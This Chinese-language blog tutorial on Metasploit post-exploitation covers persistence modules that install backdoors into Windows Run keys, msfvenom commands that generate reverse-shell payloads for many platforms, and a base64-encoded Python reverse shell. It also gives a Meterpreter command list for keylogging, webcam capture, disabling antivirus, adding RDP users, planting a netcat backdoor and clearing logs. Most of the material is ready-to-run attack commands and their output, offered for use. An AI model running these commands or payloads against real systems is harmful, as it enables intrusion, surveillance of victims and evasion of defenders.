HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-5"><a href="#2-msf基本命令-5" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-5"><a href="#3-msfvenom生成payload-5" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-5"><a href="#4-Meterpreter基本命令-5" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-5"><a href="#4-1-基本系统命令-5" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

